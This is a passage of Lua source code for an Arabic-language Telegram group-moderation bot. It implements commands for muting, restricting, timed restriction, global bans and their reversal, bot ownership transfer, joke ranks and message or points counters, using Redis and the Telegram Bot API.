if DevJoker:sismember(BlAcK..'Joker:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو بالفعل مكتوم من المجموعه")  
else
DevJoker:sadd(BlAcK..'Joker:Muted:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم كتمه من المجموعه")  
end 
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteReply)
end end
if text and text:match('^كتم @(.*)') and ChCheck(msg) then
local username = text:match('^كتم @(.*)')
function MuteUser(extra,result,success)
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الكتم والتقيد')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع كتم ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
if DevJoker:sismember(BlAcK..'Joker:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","᥀︙هو بالفعل مكتوم من المجموعه")  
else
DevJoker:sadd(BlAcK..'Joker:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم كتمه من المجموعه")  
end
end
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,MuteUser)
end
if text and text:match('^كتم (%d+)') and ChCheck(msg) then
local user = text:match('كتم (%d+)')
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الكتم والتقيد')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع كتم ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
if DevJoker:sismember(BlAcK..'Joker:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","᥀︙هو بالفعل مكتوم من المجموعه")  
else
DevJoker:sadd(BlAcK..'Joker:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","᥀︙تم كتمه من المجموعه")  
end
end
end
--     Source BlAcK     --
--         UnMute         --
if text ==('الغاء الكتم') or text ==('الغاء كتم') and ChCheck(msg) then
function UnMuteReply(extra, result, success)
if not DevJoker:sismember(BlAcK..'Joker:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو ليس مكتوم لالغاء كتمه")  
else
DevJoker:srem(BlAcK..'Joker:Muted:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم الغاء كتمه من المجموعه")  
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnMuteReply)
end end
if text and (text:match('^الغاء الكتم @(.*)') or text:match('^الغاء كتم @(.*)')) and ChCheck(msg) then
local username = text:match('^الغاء الكتم @(.*)') or text:match('^الغاء كتم @(.*)')
function UnMuteUser(extra,result,success)
if result.id_ then
if not DevJoker:sismember(BlAcK..'Joker:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","᥀︙هو ليس مكتوم لالغاء كتمه")  
else
DevJoker:srem(BlAcK..'Joker:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم الغاء كتمه من المجموعه")  
end
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnMuteUser)
end
if text and (text:match('^الغاء الكتم (%d+)') or text:match('^الغاء كتم (%d+)')) and ChCheck(msg) then
local user = text:match('الغاء الكتم (%d+)') or text:match('الغاء كتم (%d+)')
if not DevJoker:sismember(BlAcK..'Joker:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","᥀︙هو ليس مكتوم لالغاء كتمه")  
else
DevJoker:srem(BlAcK..'Joker:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","᥀︙تم الغاء كتمه من المجموعه")  
end
end 
end 
--     Source BlAcK     --
--          Tkeed           --
if Admin(msg) then
if text ==('تقييد') or text ==('تقيد') and ChCheck(msg) then
function TkeedReply(extra, result, success)
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الكتم والتقيد')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
DevJoker:sadd(BlAcK..'Joker:Tkeed:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تقيده من المجموعه")  
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),TkeedReply)
end end
if text and (text:match('^تقييد @(.*)') or text:match('^تقيد @(.*)')) and ChCheck(msg) then
local username = text:match('^تقييد @(.*)') or text:match('^تقيد @(.*)')
function TkeedUser(extra,result,success)
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الكتم والتقيد')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع تقيد ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
DevJoker:sadd(BlAcK..'Joker:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم تقيده من المجموعه")  
end
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,TkeedUser)
end
if text and (text:match('^تقييد (%d+)') or text:match('^تقيد (%d+)')) and ChCheck(msg) then
local user = text:match('تقييد (%d+)') or text:match('تقيد (%d+)')
if not JokerConstructor(msg) and DevJoker:get(BlAcK.."Joker:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الكتم والتقيد')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع تقيد ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user)
DevJoker:sadd(BlAcK..'Joker:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","᥀︙تم تقيده من المجموعه")  
end
end
--     Source BlAcK     --
--         UnTkeed          --
if text ==('الغاء تقييد') or text ==('الغاء تقيد') and ChCheck(msg) then
function UnTkeedReply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevJoker:srem(BlAcK..'Joker:Tkeed:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم الغاء تقيده من المجموعه")  
end
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnTkeedReply)
end end
if text and (text:match('^الغاء تقييد @(.*)') or text:match('^الغاء تقيد @(.*)')) and ChCheck(msg) then
local username = text:match('^الغاء تقييد @(.*)') or text:match('^الغاء تقيد @(.*)')
function UnTkeedUser(extra,result,success)
if result.id_ then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevJoker:srem(BlAcK..'Joker:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم الغاء تقيده من المجموعه")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnTkeedUser)
end
if text and (text:match('^الغاء تقييد (%d+)') or text:match('^الغاء تقيد (%d+)')) and ChCheck(msg) then
local user = text:match('الغاء تقييد (%d+)') or text:match('الغاء تقيد (%d+)')
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevJoker:srem(BlAcK..'Joker:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","᥀︙تم الغاء تقيده من المجموعه")  
end
end 
end
--     Source BlAcK     --
--         BanAll         --
if SecondSudo(msg) then
if text ==('حضر عام') or text ==('حظر عام') and ChCheck(msg) then
function BanAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(BlAcK) then  
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevJoker:sismember(BlAcK..'Joker:JokerSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevJoker:sismember(BlAcK..'Joker:SecondSudo:',result.sender_user_id_) and not JokerSudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevJoker:sadd(BlAcK..'Joker:BanAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم حظره عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanAllReply)
end end
if text and (text:match('^حضر عام @(.*)') or text:match('^حظر عام @(.*)')) and ChCheck(msg) then
local username = text:match('^حضر عام @(.*)') or text:match('^حظر عام @(.*)')
function BanAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(BlAcK) then  
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevJoker:sismember(BlAcK..'Joker:JokerSudo:',result.id_) and not Sudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevJoker:sismember(BlAcK..'Joker:SecondSudo:',result.id_) and not JokerSudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
if result.id_ then
ChatKick(msg.chat_id_, result.id_)
DevJoker:sadd(BlAcK..'Joker:BanAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم حظره عام من المجموعات")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,BanAllUser)
end
if text and (text:match('^حضر عام (%d+)') or text:match('^حظر عام (%d+)')) and ChCheck(msg) then
local user = text:match('حضر عام (%d+)') or text:match('حظر عام (%d+)')
if tonumber(user) == tonumber(BlAcK) then  
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(tonumber(user)) == true then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevJoker:sismember(BlAcK..'Joker:JokerSudo:',user) and not Sudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevJoker:sismember(BlAcK..'Joker:SecondSudo:',user) and not JokerSudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(msg.chat_id_, user)
DevJoker:sadd(BlAcK..'Joker:BanAll:', user)
ReplyStatus(msg,user,"Reply","᥀︙تم حظره عام من المجموعات")  
end
--     Source BlAcK     --
--         MuteAll        --
if text ==('كتم عام') and ChCheck(msg) then
function MuteAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(BlAcK) then  
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevJoker:sismember(BlAcK..'Joker:JokerSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevJoker:sismember(BlAcK..'Joker:SecondSudo:',result.sender_user_id_) and not JokerSudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم المطور الاساسي²*", 1, 'md')
return false 
end
DevJoker:sadd(BlAcK..'Joker:MuteAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم كتمه عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteAllReply)
end end
if text and text:match('^كتم عام @(.*)') and ChCheck(msg) then
local username = text:match('^كتم عام @(.*)')
function MuteAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(BlAcK) then  
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevJoker:sismember(BlAcK..'Joker:JokerSudo:',result.id_) and not Sudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevJoker:sismember(BlAcK..'Joker:SecondSudo:',result.id_) and not JokerSudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم المطور الاساسي²*", 1, 'md')
return false 
end
if result.id_ then
DevJoker:sadd(BlAcK..'Joker:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم كتمه عام من المجموعات")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,MuteAllUser)
end
if text and text:match('^كتم عام (%d+)') and ChCheck(msg) then
local user = text:match('كتم عام (%d+)')
if tonumber(user) == tonumber(BlAcK) then  
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(tonumber(user)) == true then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevJoker:sismember(BlAcK..'Joker:JokerSudo:',user) and not Sudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevJoker:sismember(BlAcK..'Joker:SecondSudo:',user) and not JokerSudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع كتم المطور الاساسي²*", 1, 'md')
return false 
end
DevJoker:sadd(BlAcK..'Joker:MuteAll:', user)
ReplyStatus(msg,user,"Reply","᥀︙تم كتمه عام من المجموعات")  
end
--     Source BlAcK     --
--         UnAll          --
if text ==('الغاء عام') or text ==('الغاء العام') and ChCheck(msg) then
function UnAllReply(extra, result, success)
DevJoker:srem(BlAcK..'Joker:BanAll:', result.sender_user_id_)
DevJoker:srem(BlAcK..'Joker:MuteAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnAllReply)
end end
if text and (text:match('^الغاء عام @(.*)') or text:match('^الغاء العام @(.*)')) and ChCheck(msg) then
local username = text:match('^الغاء عام @(.*)') or text:match('^الغاء العام @(.*)')
function UnAllUser(extra,result,success)
if result.id_ then
DevJoker:srem(BlAcK..'Joker:BanAll:', result.id_)
DevJoker:srem(BlAcK..'Joker:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","᥀︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnAllUser)
end
if text and (text:match('^الغاء عام (%d+)') or text:match('^الغاء العام (%d+)')) and ChCheck(msg) then
local user = text:match('الغاء عام (%d+)') or text:match('الغاء العام (%d+)')
DevJoker:srem(BlAcK..'Joker:BanAll:', user)
DevJoker:srem(BlAcK..'Joker:MuteAll:', user)
ReplyStatus(msg,user,"Reply","᥀︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
end
end
end
--     Source BlAcK     --
if (text == "تغير المطور الاساسي" or text == "نقل ملكيه البوت" or text == "تغيير المطور الاساسي" or text == "↫ تغير المطور الاساسي ᥀") and msg.reply_to_message_id_ == 0 and Sudo(msg) and ChCheck(msg) then 
send(msg.chat_id_, msg.id_,'᥀︙يجب التاكد ان المطور الجديد ارسل start لخاص البوت بعد ذلك يمكنك ارسال ايدي المطور')
DevJoker:setex(BlAcK.."Joker:EditDev"..msg.sender_user_id_,300,true)
end
if DevJoker:get(BlAcK.."Joker:EditDev"..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,'᥀︙تم الغاء امر تغير المطور الاساسي')
DevJoker:del(BlAcK.."Joker:EditDev"..msg.sender_user_id_)
return false
end
if text and text:match("^(%d+)$") then 
tdcli_function ({ID = "GetUser",user_id_ = text},function(arg,dp) 
if dp.first_name_ ~= false then
DevJoker:del(BlAcK.."Joker:EditDev"..msg.sender_user_id_)
DevJoker:set(BlAcK.."Joker:NewDev"..msg.sender_user_id_,dp.id_)
if dp.username_ ~= false then DevUser = '\n᥀︙المعرف ↫ [@'..dp.username_..']' else DevUser = '' end
local Text = '᥀︙الايدي ↫ '..dp.id_..DevUser..'\n᥀︙الاسم ↫ ['..dp.first_name_..'](tg://user?id='..dp.id_..')\n᥀︙تم حفظ المعلومات بنجاح\n᥀︙استخدم الازرار للتاكيد ↫ ⤈'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/setyes"},{text="لا",callback_data="/setno"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,"᥀︙المعلومات خاطئه قم بالتاكد واعد المحاوله")
DevJoker:del(BlAcK.."Joker:EditDev"..msg.sender_user_id_)
end
end,nil)
return false
end
end
--     Source BlAcK     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع مطي$") and not DevJoker:get(BlAcK..'Joker:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if DevJoker:sismember(BlAcK..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو مطي شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم رفعه في قائمة المطايه") 
DevJoker:sadd(BlAcK..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source BlAcK     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل مطي$") and not DevJoker:get(BlAcK..'Joker:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if not DevJoker:sismember(BlAcK..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو ليس مطي ليتم تنزيله") 
else
DevJoker:srem(BlAcK..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من قائمة المطايه") 
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source BlAcK     --
if Admin(msg) then
if text and (text:match('^تقييد دقيقه (%d+)$') or text:match('^كتم دقيقه (%d+)$') or text:match('^تقيد دقيقه (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^تقييد دقيقه (%d+)$') or text:match('^كتم دقيقه (%d+)$') or text:match('^تقيد دقيقه (%d+)$')
local Minutes = string.gsub(mutept, 'm', '')
local num1 = tonumber(Minutes) * 60 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تقيده لمدة ↫ "..mutept.." د") 
DevJoker:sadd(BlAcK..'Joker:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end 
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end
if text and (text:match('^تقييد ساعه (%d+)$') or text:match('^كتم ساعه (%d+)$') or text:match('^تقيد ساعه (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^تقييد ساعه (%d+)$') or text:match('^كتم ساعه (%d+)$') or text:match('^تقيد ساعه (%d+)$')
local hour = string.gsub(mutept, 'h', '')
local num1 = tonumber(hour) * 3600 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تقيده لمدة ↫ "..mutept.." س") 
DevJoker:sadd(BlAcK..'Joker:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end 
if text and (text:match('^تقييد يوم (%d+)$') or text:match('^كتم يوم (%d+)$') or text:match('^تقيد يوم (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
local mutept = text:match('^تقييد يوم (%d+)$') or text:match('^كتم يوم (%d+)$') or text:match('^تقيد يوم (%d+)$')
local day = string.gsub(mutept, 'd', '')
local num1 = tonumber(day) * 86400 
if RankChecking(result.sender_user_id_, msg.chat_id_) then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md') 
else 
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تقيده لمدة ↫ "..mutept.." ي") 
DevJoker:sadd(BlAcK..'Joker:Tkeed:'..msg.chat_id_, result.sender_user_id_)
end end
if tonumber(msg.reply_to_message_id_) == 0 then else
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
end 
end 
--     Source BlAcK     --
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if Constructor(msg) then
TXT = text:match("^اضف رسائل (%d+)$")
DevJoker:set('BlAcKTeam:'..BlAcK..'id:user'..msg.chat_id_,TXT)  
DevJoker:setex('BlAcKTeam:'..BlAcK.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙ارسل عدد الرسائل الان \n᥀︙ارسل الغاء لالغاء الامر ", 1, "md")
Dev_Joker(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙هذا الامر للمنشئين فقط', 1, 'md') 
end 
end 
if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف رسائل (%d+)$")
function Reply(extra, result, success)
DevJoker:del(BlAcK..'Joker:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_) 
DevJoker:incrby(BlAcK..'Joker:UsersMsgs'..msg.chat_id_..':'..result.sender_user_id_,Num) 
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم اضافة "..Num..' رساله', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
if Constructor(msg) then
TXT = text:match("^اضف نقاط (%d+)$")
DevJoker:set('BlAcKTeam:'..BlAcK..'ids:user'..msg.chat_id_,TXT)  
DevJoker:setex('BlAcKTeam:'..BlAcK.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙ارسل عدد النقاط الان \n᥀︙ارسل الغاء لالغاء الامر ", 1, "md")
Dev_Joker(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙هذا الامر للمنشئين فقط', 1, 'md') 
end 
end 
if text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local Num = text:match("^اضف نقاط (%d+)$")
function Reply(extra, result, success)
DevJoker:incrby(BlAcK..'Joker:GamesNumber'..msg.chat_id_..result.sender_user_id_,Num) 
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم اضافة "..Num..' نقطه', 1, 'md') 
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},Reply, nil)
return false
end
if DevJoker:get(BlAcK..'Joker:Lock:Clean'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevJoker:sadd(BlAcK.."Joker:cleaner"..msg.chat_id_, msg.id_) else DevJoker:sadd(BlAcK.."Joker:cleaner"..msg.chat_id_, msg.id_) end end end
if DevJoker:get(BlAcK..'Joker:Lock:CleanNum'..msg.chat_id_) then if msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.photo_ or msg.content_.animation_ or msg.content_.animated_ then if msg.reply_to_message_id_ ~= 0 then DevJoker:sadd(BlAcK.."Joker:cleanernum"..msg.chat_id_, msg.id_) else DevJoker:sadd(BlAcK.."Joker:cleanernum"..msg.chat_id_, msg.id_) end end end
if DevJoker:get(BlAcK..'Joker:Lock:CleanMusic'..msg.chat_id_) then if msg.content_.voice_ or msg.content_.audio_ then if msg.reply_to_message_id_ ~= 0 then DevJoker:sadd(BlAcK.."Joker:cleanermusic"..msg.chat_id_, msg.id_) else DevJoker:sadd(BlAcK.."Joker:cleanermusic"..msg.chat_id_, msg.id_) end end end
